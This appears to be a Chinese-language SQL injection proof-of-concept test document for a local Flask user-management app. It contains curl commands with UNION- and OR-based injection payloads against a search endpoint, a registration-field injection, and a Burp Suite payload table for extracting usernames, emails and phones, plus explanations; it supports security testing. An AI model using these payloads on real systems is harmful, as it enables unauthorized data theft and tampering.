# SQL 注入 POC 测试文档

> **项目**: flask-user-management  
> **测试目标**: 搜索功能 SQL 注入 & 注册功能 SQL 注入  
> **测试日期**: 2026-07-08  

---

## 目录

1. [测试环境搭建](#1-测试环境搭建)
2. [POC 1: UNION 注入获取任意数据](#2-poc-1-union-注入获取任意数据)
3. [POC 2: OR 注入搜索全部用户](#3-poc-2-or-注入搜索全部用户)
4. [POC 3: 注册功能 SQL 注入](#4-poc-3-注册功能-sql-注入)
5. [Burp Suite 测试方法](#5-burp-suite-测试方法)
6. [原理解析](#6-原理解析)

---

## 1. 测试环境搭建

```bash
pip install flask werkzeug
python3 app.py
# 应用运行在 http://127.0.0.1:5000
```

## 2. POC 1: UNION 注入获取任意数据

利用 UNION 关键字合并第二个 SELECT 查询，在结果中插入自定义数据。

```bash
# 登录获取 cookie
curl http://127.0.0.1:5000/login -d "username=admin&password=admin123" -c /tmp/cookies.txt

# UNION 注入
curl "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj@x.com%27,%27138%27--" -b /tmp/cookies.txt
```

### 生成 SQL
```sql
SELECT * FROM users WHERE username LIKE '%' UNION SELECT 1,'inj','inj@x.com','138'--%'
```

## 3. POC 2: OR 注入搜索全部用户

OR 注入使 WHERE 条件恒真，返回所有用户。

```bash
curl "http://127.0.0.1:5000/search?keyword=%27%20OR%20%271%27%3D%271" -b /tmp/cookies.txt
```

### 生成 SQL
```sql
SELECT * FROM users WHERE username LIKE '%' OR '1'='1%' OR email LIKE '%' OR '1'='1%'
```

## 4. POC 3: 注册功能 SQL 注入

在用户名字段闭合 SQL 语句。

```bash
curl http://127.0.0.1:5000/register -d "username=hacker', 'pass', 'h@x.com', '123')--&password=irrelevant"
```

### 生成 SQL
```sql
INSERT INTO users (username, password, email, phone) VALUES ('hacker', 'pass', 'h@x.com', '123')--', 'irrelevant', '', '')
```

## 5. Burp Suite 测试方法

1. 配置浏览器代理 127.0.0.1:8080
2. 拦截 GET /search?keyword=admin 请求
3. 发送到 Repeater 测试以下 Payload：

| Payload | 效果 |
|---------|------|
| admin' OR '1'='1 | 返回所有用户 |
| ' UNION SELECT 1,2,3,4-- | 测试列数 |
| ' UNION SELECT 1,username,email,phone FROM users-- | 提取数据 |

## 6. 原理解析

### 为什么列数必须是 4？
```sql
SELECT * FROM users 返回 4 列(id, username, email, phone)
UNION SELECT 1,'inj','inj@x.com','138' 也必须返回 4 列
```
列数不匹配则报错。

### 为什么 OR 注入能返回全部用户？
`' OR '1'='1` 注入后，WHERE 条件包含永真式 `'1'='1'`，所有行都被返回。

### 为什么注册注入能成功？
`--` 注释掉后续 SQL，攻击者控制了所有字段值。

---

> 修复方案参见 SECURITY_AUDIT_REPORT.md
